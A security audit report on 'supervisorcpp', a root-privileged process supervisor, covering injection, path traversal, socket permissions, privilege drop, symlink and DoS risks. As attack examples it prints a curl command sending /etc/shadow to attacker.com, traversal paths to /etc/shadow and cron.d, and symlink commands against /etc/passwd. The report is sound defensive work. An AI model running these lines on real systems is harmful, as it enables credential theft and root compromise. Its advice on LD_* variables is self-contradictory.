# Security Audit Report - supervisorcpp

**Date**: 2025-11-14
**Version**: 1.0
**Scope**: Complete codebase security review for root-running process supervisor

## Executive Summary

supervisorcpp is a process supervisor that runs with root privileges and executes arbitrary commands. This presents significant security risks that must be carefully managed. This audit identifies vulnerabilities and recommends mitigations.

**Risk Level**: HIGH (runs as root, spawns processes, network-exposed RPC)

---

## Critical Security Concerns

### 1. Command Injection Vulnerabilities

**Location**: `src/process/process.cpp:spawn()`

**Risk**: HIGH
**Status**: ⚠️ VULNERABLE

**Issue**:
```cpp
// Current implementation uses execvp with shell parsing
std::vector<char*> args;
// Command string is split on spaces - vulnerable to injection
```

**Attack Vector**:
```ini
[program:malicious]
command=/bin/sh -c "whoami; curl http://attacker.com/exfil?data=$(cat /etc/shadow)"
```

**Recommendation**:
- ✅ Already using `execvp` (not system()) - GOOD
- ⚠️ Command parsing needs validation
- Add command whitelist option for critical deployments
- Validate command paths are absolute
- Reject commands with suspicious characters in non-shell contexts

---

### 2. Path Traversal Attacks

**Location**: Multiple files

**Risk**: MEDIUM
**Status**: ⚠️ PARTIALLY VULNERABLE

**Issue 1 - Include Files**:
```cpp
// config_parser.cpp - glob expansion
std::vector<std::filesystem::path> expand_glob(const std::filesystem::path& base_dir,
                                                const std::string& pattern)
```

**Attack Vector**:
```ini
[include]
files = ../../../../etc/shadow
```

**Issue 2 - Log Files**:
```ini
[program:malicious]
stdout_logfile = ../../../../etc/cron.d/backdoor
```

**Recommendations**:
- ✅ Use canonical paths to resolve symlinks
- ⚠️ Validate all paths stay within allowed directories
- Restrict include files to specific directories
- Validate log file paths don't escape /var/log
- Check file ownership before writing

---

### 3. Unix Socket Permission Issues

**Location**: `src/rpc/rpc_server.cpp`

**Risk**: HIGH
**Status**: ⚠️ VULNERABLE

**Issue**:
```cpp
// Socket created with default permissions
// Any local user can connect and control all processes
acceptor_.open(endpoint.protocol());
acceptor_.bind(endpoint);
```

**Attack Vector**:
- Local user connects to socket
- Starts/stops arbitrary processes
- Reads process output
- Shutdowns supervisor

**Recommendations**:
- ✅ Set socket permissions to 0600 (owner only)
- Add authentication mechanism
- Validate connecting user credentials
- Add ACL support for multi-user systems
- Log all RPC connections

---

### 4. User Switching Vulnerabilities

**Location**: `src/process/process.cpp:setup_child_process()`

**Risk**: CRITICAL
**Status**: ⚠️ NEEDS REVIEW

**Issue**:
```cpp
// Current order:
// 1. setgid
// 2. initgroups
// 3. setuid
```

**Potential Issues**:
- Incomplete privilege drop
- Supplementary groups not cleared
- No verification of successful drop
- Filesystem capabilities retained

**Recommendations**:
- ✅ Verify setuid/setgid return values
- ⚠️ Clear supplementary groups explicitly
- Drop filesystem capabilities
- Verify final UID/GID after drop
- Set PR_SET_NO_NEW_PRIVS

---

### 5. Environment Variable Injection

**Location**: `supervisor-lib/config/config_parser.cpp`, `supervisor-lib/util/secure.cpp`

**Risk**: LOW
**Status**: ✅ SAFE

**Rationale**: Config file security (ownership by root, not world-writable) is the trust
boundary. An attacker who can modify the config to inject a malicious `LD_PRELOAD` can
equally modify the `command=` directive to run an arbitrary binary. Blocking environment
variables at this layer adds no real security while preventing legitimate use cases
(e.g. `LD_LIBRARY_PATH=/opt/apps/lib` for applications with custom library paths).

**Implemented**:

- ✅ Validate environment variable names (alphanumeric + underscore only)
- ✅ Reject values containing null bytes
- ✅ Config file ownership and permission checks (`validate_config_file_security`)

---

### 6. Signal Handling Race Conditions

**Location**: `src/process/process_manager.cpp`

**Risk**: LOW
**Status**: ✅ MOSTLY SAFE

**Current Implementation**:
```cpp
// Using Boost.Asio signal_set - async safe
boost::asio::signal_set signals_(io_context_, SIGCHLD);
```

**Recommendations**:
- ✅ Already using async-safe signal handling
- Consider rate limiting process restarts (DoS prevention)
- Add maximum spawn rate limit

---

### 7. Configuration File Security

**Location**: `src/config/config_parser.cpp`

**Risk**: CRITICAL
**Status**: ⚠️ VULNERABLE

**Issues**:

**a) No ownership verification**:
```cpp
// Config file can be owned by anyone
// Root reads attacker-controlled config
```

**b) World-writable config**:
```bash
# Attacker can modify config
chmod 666 /etc/supervisord.conf
```

**c) Symlink attacks**:
```bash
ln -s /etc/shadow /etc/supervisord.conf
```

**Recommendations**:
- ✅ Verify config file ownership (must be root)
- ⚠️ Reject world-writable configs (max permissions 0644)
- Verify config is regular file (not symlink)
- Validate included files have same security requirements
- Check parent directory permissions

---

### 8. Log File Security

**Location**: `src/process/log_writer.cpp`

**Risk**: MEDIUM
**Status**: ⚠️ NEEDS HARDENING

**Issues**:

**a) Log file permissions**:
```cpp
// Current: Uses default umask
// Risk: Logs may be world-readable with secrets
```

**b) Disk space exhaustion**:
```cpp
// Rotation based on size but no total limit
// Attacker can fill disk with logs
```

**c) Symlink attacks**:
```cpp
// Before rotation, attacker creates:
ln -s /etc/passwd /var/log/app.log.1
// Rotation overwrites /etc/passwd
```

**Recommendations**:
- Set log permissions explicitly (0640)
- Check for symlinks before rotation
- Implement global disk usage limits
- Use atomic file operations for rotation
- Verify log directory ownership

---

### 9. RPC Protocol Vulnerabilities

**Location**: `src/rpc/rpc_server.cpp`

**Risk**: MEDIUM
**Status**: ⚠️ NEEDS HARDENING

**Issues**:

**a) No request size limits**:
```cpp
// Attacker can send huge XML documents
// Memory exhaustion DoS
```

**b) XML parsing vulnerabilities**:
```cpp
// Boost.PropertyTree XML parser
// Potential XXE, billion laughs, etc.
```

**c) No rate limiting**:
```cpp
// Attacker can spam requests
// CPU/memory exhaustion
```

**Recommendations**:
- Add maximum request size (e.g., 1MB)
- Disable XML external entities
- Rate limit connections per second
- Timeout long-running requests
- Add connection limits

---

### 10. Resource Exhaustion

**Location**: Multiple

**Risk**: MEDIUM
**Status**: ⚠️ NEEDS LIMITS

**Issues**:

**a) Process limits**:
```cpp
// No limit on number of processes
// Fork bomb possible via config
```

**b) Memory limits**:
```cpp
// No memory limits on child processes
// OOM killer may kill supervisor
```

**c) File descriptor limits**:
```cpp
// Each process uses 2-3 FDs (stdout, stderr, socket)
// Can exhaust system FD limit
```

**Recommendations**:
- Add maximum process count (default: 100)
- Set RLIMIT_NPROC for children
- Set RLIMIT_AS for memory limits
- Monitor own FD usage
- Implement graceful degradation

---

### 11. Information Disclosure

**Location**: Multiple

**Risk**: LOW
**Status**: ⚠️ MINOR LEAKS

**Issues**:

**a) Error messages**:
```cpp
throw std::runtime_error("Failed to open: " + path);
// Leaks filesystem structure
```

**b) Process output in logs**:
```cpp
// Child process may log secrets
// Logs readable by attacker
```

**Recommendations**:
- Sanitize error messages
- Redact sensitive paths in errors
- Add option to filter log output
- Warn about sensitive data in configs

---

### 12. Race Conditions (TOCTOU)

**Location**: Multiple file operations

**Risk**: MEDIUM
**Status**: ⚠️ VULNERABLE

**Issue**:
```cpp
// Check file exists
if (fs::exists(config_file)) {
    // Attacker swaps file here (TOCTOU)
    parse_file(config_file);
}
```

**Recommendations**:
- Use O_NOFOLLOW for file opens
- Open file descriptors early
- Use fstat() not stat()
- Avoid check-then-use patterns

---

## Security Best Practices Checklist

### Implemented ✅
- [x] No use of system() or popen()
- [x] Using execvp (not shell)
- [x] Async-safe signal handling
- [x] Input validation for config parsing
- [x] Proper setuid/setgid ordering

### Missing ⚠️
- [ ] Socket permission hardening (chmod socket to 0600)
- [ ] Config file ownership verification
- [ ] Path canonicalization and sandboxing
- [ ] Resource limits (RLIMIT_*)
- [ ] Request size limits for RPC
- [ ] Rate limiting for RPC
- [ ] Environment variable sanitization
- [ ] Log file permission enforcement
- [ ] Symlink attack prevention
- [ ] Privilege drop verification
- [ ] Security logging/auditing

### Recommended Additions 🔒
- [ ] Seccomp filter to restrict syscalls
- [ ] AppArmor/SELinux profile
- [ ] Capabilities instead of full root
- [ ] Namespace isolation for processes
- [ ] Read-only rootfs for supervisor
- [ ] Integrity checking (signatures)

---

## Threat Model

### Attackers

1. **Malicious Local User**
   - Can read config files
   - Can connect to Unix socket
   - Can create symlinks
   - Goal: Escalate to root

2. **Compromised Child Process**
   - Running as unprivileged user
   - Can access supervisor socket
   - Goal: Break out, affect other processes

3. **Configuration Attacker**
   - Can modify config files
   - Can create includes
   - Goal: Execute arbitrary code as root

### Assets to Protect

1. Root privilege
2. Process execution control
3. System stability
4. Confidentiality of logs
5. Configuration integrity

---

## Recommended Mitigations Priority

### Priority 1 - CRITICAL (Fix Immediately)

1. **Socket Permissions**: chmod 0600 on Unix socket
2. **Config Ownership**: Verify config owned by root, mode ≤ 0644
3. **Path Validation**: Canonicalize and validate all paths
4. **Privilege Drop**: Verify successful UID/GID change

### Priority 2 - HIGH (Fix Soon)

5. **Environment Sanitization**: Blacklist LD_* variables
6. **Request Limits**: Max RPC request size 1MB
7. **Resource Limits**: Max 100 processes, RLIMIT enforcement
8. **Log Permissions**: Set to 0640 explicitly

### Priority 3 - MEDIUM (Fix Before Production)

9. **Rate Limiting**: 100 RPC requests/second
10. **Symlink Prevention**: O_NOFOLLOW everywhere
11. **Error Sanitization**: Don't leak paths in errors
12. **Security Logging**: Audit all privileged operations

### Priority 4 - LOW (Nice to Have)

13. **Seccomp Filter**: Restrict to needed syscalls
14. **AppArmor Profile**: Confine supervisor
15. **Capabilities**: Drop to CAP_SETUID + CAP_KILL only
16. **Config Signing**: Verify config integrity

---

## Testing Recommendations

### Security Test Suite

1. **Privilege Escalation Tests**
   - Verify user switching
   - Test supplementary groups
   - Check capability dropping

2. **Injection Tests**
   - Path traversal attempts
   - Command injection
   - Environment injection

3. **DoS Tests**
   - Fork bomb via config
   - Disk fill via logs
   - Memory exhaustion
   - FD exhaustion
   - RPC request spam

4. **Permission Tests**
   - Socket permissions
   - Config file permissions
   - Log file permissions

---

## Conclusion

supervisorcpp has a solid foundation but requires significant security hardening before production use in security-sensitive environments. The most critical issues are:

1. Unix socket permissions (trivial to exploit)
2. Config file validation (root reads any file)
3. Path validation (directory traversal)
4. Resource limits (DoS via config)

These should be addressed before any production deployment where security matters.

**Recommended Actions**:
1. Implement Priority 1 fixes (CRITICAL)
2. Add security test suite
3. Perform penetration testing
4. Document security assumptions
5. Create security hardening guide
